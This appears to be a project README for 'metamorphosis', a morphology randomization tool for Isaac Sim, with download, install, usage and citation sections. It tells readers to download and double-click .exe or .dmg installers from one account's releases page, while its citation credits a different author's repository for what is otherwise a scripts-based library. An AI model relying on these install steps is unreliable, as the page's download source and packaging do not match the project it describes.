---
layout: "default"
title: "🦋 metamorphosis - Simple Morphology Randomization for Everyone"
description: "🦾 Enhance robotic simulations with Metamorphosis, a minimalist tool for morphology randomization in Isaac Sim, suitable for research and development."
---
# 🦋 metamorphosis - Simple Morphology Randomization for Everyone

## 🔗 Download

[![Latest Release](https://img.shields.io/github/v/release/rafatiyan/metamorphosis)](https://github.com/rafatiyan/metamorphosis/releases)

## 🚀 Getting Started

Welcome to the **metamorphosis** project! This application offers a simple way to explore and use morphology randomization in Isaac Sim. Whether you are a beginner or have some experience, this guide will help you set up and run the application without technical fuss.

## 📥 Download & Install

1. **Visit the Releases Page**: Go to the following link to download the application.  
   [Download metamorphosis](https://github.com/rafatiyan/metamorphosis/releases)

2. **Choose the Right File**: Look for the latest version. You will find executable files for your operating system. Download the file that matches your computer.

3. **Install the Application**:  
   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
   - For Mac: Open the downloaded `.dmg` file and drag the application into your Applications folder.

4. **Dependencies**: If you want to run the application without IsaacLab, you will need to install Open-USD. You can do this using the terminal or command prompt by running the following command:  
   ```bash
   pip install usd-core
   ```
   **Important**: IsaacSim uses a custom USD build. If you experience errors after running the above command, please uninstall it.

## 🔍 Usage

With the application installed, you can start using it.

1. **Navigate to Example Scripts**: The application includes example scripts found in the `scripts/` folder. These scripts demonstrate how to use the application.

2. **Running the Application**: Open your terminal or command prompt, navigate to the application's directory, and execute the main script. 

3. **Configuration Settings**: 
   - Before running, make sure to set the following options in your configuration:
     - `replicate_physics=False`
     - `enabled_self_collisions=False`
   These settings help the application run smoothly.

## 📝 Features

- **Morphology Randomization**: This feature allows you to easily modify the shapes and sizes of objects.
- **Compatibility**: Works with both IsaacSim and as a standalone tool.
- **User-Friendly Scripts**: Pre-written example scripts make it easy to get started.

## 🔧 Troubleshooting

If you run into any issues:

- **Installation Errors**: Ensure you have downloaded the correct version for your operating system.
- **Run-Time Errors**: Double-check your configuration settings. Misconfiguration can lead to crashes or unexpected behavior.

## 📚 Citation

If you use this application in your research, please follow this citation format:

```
@misc{metamorphosis2026,
  title={Metamorphosis: A Framework for Procedural Asset Generation in Isaac Sim},
  author={Botian Xu},
  year={2026},
  url={https://github.com/btx0424/metamorphosis}
}
```

## 📄 Additional Resources

For further information on using the application or if you encounter problems, please consult the following resources:

1. **Documentation**: Check for any documentation provided in the repository for detailed explanations.
2. **Community Support**: Join community forums for user discussions and solutions.
3. **Report Issues**: For any bugs or issues, feel free to report them on the repository's issue tracker.

Thank you for using **metamorphosis**! We hope this application enhances your work with Isaac Sim.